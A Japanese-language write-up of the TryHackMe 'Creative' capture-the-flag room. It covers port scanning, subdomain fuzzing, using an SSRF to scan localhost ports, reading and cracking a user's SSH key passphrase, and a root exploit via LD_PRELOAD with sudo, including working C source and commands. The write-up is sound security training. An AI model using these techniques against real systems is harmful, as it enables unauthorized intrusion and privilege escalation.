# Creative CTF

https://tryhackme.com/room/creative

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.173.205
root@ip-10-10-131-144:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-27 06:17 GMT
Nmap scan report for 10.10.173.205
Host is up (0.0013s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:EA:32:DD:A4:C7 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 104.64 seconds
root@ip-10-10-131-144:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-27 06:20 GMT
Nmap scan report for 10.10.173.205
Host is up (0.00018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
MAC Address: 02:EA:32:DD:A4:C7 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds
```

OpenSSH, nginx

IP で Web アクセスすると、`http://creative.thm/` に転送される。hosts に追加。

### ディレクトリ検索

gobuster と dirb では特別なものは出なかった。

### サブドメイン検索

```shell
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -X GET -H "Host: FUZZ.creative.thm" -u http://creative.thm -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 307ms]
:: Progress: [4989/4989] :: Job [1/1] :: 127 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

beta が出てきたので、hosts に追加。

### beta.creative.thm

URL を入力すると GET リクエストしてそのまま表示するような動作。

kali 上に PHP を置いてリクエストさせてみたところ、PHP が実行されるのではなく、PHP コードがそのまま表示されるような動作になった。

リクエストを見ると、python-requests を使っている。

```shell
$ nc -nlvp 8000
listening on [any] 8000 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.173.205] 44760
GET /pentest.php HTTP/1.1
Host: 10.2.22.182:8000
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

こういう形を想定。

```python
import requests
r = requests.get(url)
```

この形ではコードインジェクションはできないと思うので、ローカルポートを探すことにする。

```shell
$ seq 1 80000 > port_list

$ ffuf -w ./port_list -X POST -d "url=http://localhost:FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://beta.creative.thm -fs 13

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://beta.creative.thm
 :: Wordlist         : FUZZ: /home/kali/CTF/port_list
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : url=http://localhost:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13
________________________________________________

80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 281ms]
1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 266ms]
```

1337 ポートが開いていることを確認。

## localhost:1337

1337 ポートにブラウザでアクセスすると、ルートディレクトリのリストが表示された。

```
Directory listing for /

    bin@
    boot/
    dev/
    etc/
    home/
    lib@
    lib32@
    lib64@
    libx32@
    lost+found/
    media/
    mnt/
    opt/
    proc/
    root/
    run/
    sbin@
    snap/
    srv/
    swap.img
    sys/
    tmp/
    usr/
    var/
```

```
Directory listing for /home/

    saad/
```

```
Directory listing for /home/saad/

    .bash_history
    .bash_logout
    .bashrc
    .cache/
    .gnupg/
    .local/
    .profile
    .ssh/
    .sudo_as_admin_successful
    snap/
    start_server.py
    user.txt
```

user.txt

```
9a1................................
```

.bash_history

```
whoami pwd ls -al ls cd .. sudo -l echo "saad:ひみつ" > creds.txt rm creds.txt sudo -l whomai whoami pwd ls -al sudo -l ls -al pwd whoami mysql -u root -p netstat -antlp mysql -u root sudo su ssh root@192.169.155.104 mysql -u user -p mysql -u db_user -p ls -ld /var/lib/mysql ls -al cat .bash_history cat .bash_logout nano .bashrc ls -al
```

.ssh/id_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA1J8+LAd
rb49YHdSMzgX80AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDBbWMPTToe
中略
ksrXEYjaMdndnvxBZ0zi9T+ywag=
-----END OPENSSH PRIVATE KEY-----
```

秘密鍵を得たが、パスフレーズが必要。

パスフレーズをクラック

```shell
$ ssh2john ./id_rsa_saad > hash_saad

$ john ./hash_saad
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
ひみつ        (./id_rsa_saad)
1g 0:00:07:30 DONE 2/3 (2025-03-27 03:56) 0.002217g/s 46.72p/s 46.72c/s 46.72C/s rosita..sweetness
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

割れた。このパスフレーズを使い、SSH 接続成功。

```shell
$ ssh saad@10.10.173.205 -i ./id_rsa_saad
Enter passphrase for key './id_rsa_saad':

saad@m4lware:~$
```

## 権限昇格

sudo。パスワードは .bash_history に残されていたものを使えた。

```shell
saad@m4lware:~$ sudo -l
[sudo] password for saad:
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```

sudo で ping を実行できるが、ping そのものは昇格に使えない。

よく見ると、`env_keep+=LD_PRELOAD` が付いていたので昇格に使える。

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash -p");
}
```

ターゲットにソースコードをコピーし、ビルド

```shell
saad@m4lware:~$ gcc -fPIC -shared -o /tmp/x.so ./hijack.c -nostartfiles
```

エクスプロイト

```shell
saad@m4lware:~$ sudo LD_PRELOAD=/tmp/x.so /usr/bin/ping
[sudo] password for saad:
root@m4lware:/home/saad# id
uid=0(root) gid=0(root) groups=0(root)
```

昇格成功。

```shell
root@m4lware:/home/saad# cat /root/root.txt
992...........................
```

ルートフラグゲット！

## 振り返り

- サブドメイン検索は最近よく使うので、すぐ見つかった。それは良かった。
- SSRF で ローカル HTTP ポートをスキャンするのは初めてのパターン。
- LD_PRELOAD の悪用は最初期に習ったテクニックだったが、すっかり忘れていて時間がかかった。反省。

## Tags

#tags:SSRF
